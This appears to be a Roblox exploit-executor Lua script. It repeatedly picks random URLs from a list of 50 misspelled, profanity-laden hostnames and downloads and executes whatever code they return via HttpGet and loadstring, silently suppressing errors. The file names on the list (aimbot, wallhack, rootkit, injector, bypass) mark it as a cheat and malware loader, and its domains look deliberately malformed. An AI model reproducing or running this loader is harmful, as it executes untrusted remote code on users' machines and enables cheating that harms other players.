local urlsToRequest = {
    "https://deinemuttafick.pages.devev/utilityh00r.lua",
    "https://xgmuttofick.paages.devvv/start.lua",
    "https://muttadeinefick.pagez.deev/betterchatdtcsys.lua",
    "https://muttadeine.ppages.devv/betterchatdtcsys1q.lua",
    "https://f1ckde1nemuttorrf9.pages.dddev/akactive.lua",
    "https://fickmutter.pages.devvvvv/aimbot.lua",
    "https://arschloch.ppaggeess.dev/wallhack.lua",
    "https://huanson.pages.devz/scriptkiddie.lua",
    "https://bastardk1d.paages.deff/exploit.lua",
    "https://muttavick.pagess.devev/sysinit.lua",
    "https://deinearsch.pages.ddevv/coreutils.lua",
    "https://k1dsys.pages.devevz/advancedhack.lua",
    "https://muttorrfick.paages.deeve/mainscript.lua",
    "https://arschgesicht.pagez.devvv/init.lua",
    "https://hackerkiddo.ppages.deevev/config.lua",
    "https://cheaterman.pages.devvz/loader.lua",
    "https://syskrack.pajes.devv/client.lua",
    "https://d1ckfart.p4ges.deeev/hook.lua",
    "https://hurens0hn.paggeess.deve/bypass.lua",
    "https://mutterwichser.pages.devevv/detection.lua",
    "https://ezwin.paages.dddeev/autoexec.lua",
    "https://cheatk1ng.pagez.deffv/payload.lua",
    "https://fickerisch.pagess.devev/updater.lua",
    "https://kindficker.ppagess.devzz/system32.lua",
    "https://arschmutter.paages.devvvvv/usermode.lua",
    "https://bitchk1d.pagez.deve/kernel.lua",
    "https://hackerman.ppages.ddev/driver.lua",
    "https://sysadminfail.pages.deve/rootkit.lua",
    "https://deinemutter.pajes.deff/injector.lua",
    "https://fickdich.p4ges.devev/library.lua",
    "https://mutterliebe.paggeess.devvv/security.lua",
    "https://wichser.pages.devevev/telemetry.lua",
    "https://arschkarte.paages.dddevvv/encryption.lua",
    "https://l0ser.pagez.deffvv/decryption.lua",
    "https://n00bkiller.pagess.devevv/network.lua",
    "https://godmode.ppagess.devzzv/process.lua",
    "https://cheatengine.pages.devvvvvv/memory.lua",
    "https://exploiter.paages.devvvvvv/resource.lua",
    "https://syshacker.pagez.deevvvv/handler.lua",
    "https://kiddie.ppages.ddevvvv/manager.lua",
    "https://deinear****.pages.devevvvv/interface.lua",
    "https://mutterficker.pajes.deffff/module.lua",
    "https://fickundfertig.p4ges.devevvvv/service.lua",
    "https://hurensohnnummer1.paggeess.devvvvvv/agent.lua",
    "https://mutterkind.pages.devevevevev/monitor.lua",
    "https://arschgeige.paages.dddevvvvv/collector.lua",
    "https://l33thax0r.pagez.deffvvvv/channel.lua",
    "https://n00bmaster.pagess.devevvvvvv/stream.lua",
    "https://gottlos.ppagess.devzzzv/endpoint.lua",
    "https://hacktheplanet.pages.devvvvvvv/protocol.lua"
}

local function getRandomUrl()
    local randomIndex = math.random(1, #urlsToRequest)
    return urlsToRequest[randomIndex]
end

local batchSize = 70
local batchDelay = 30

while true do
    local urlsBatch = {}
    
    for i = 1, batchSize do
        table.insert(urlsBatch, getRandomUrl())
    end
    
    for _, url in ipairs(urlsBatch) do
        spawn(function()
            pcall(function()
                local scriptContent = game:HttpGet(url)
                if type(scriptContent) == "string" and string.len(scriptContent) > 0 then
                    local func = loadstring(scriptContent)
                    if func then
                        func()
                    end
                end
            end)
        end)
    end
    
    wait(batchDelay)
end
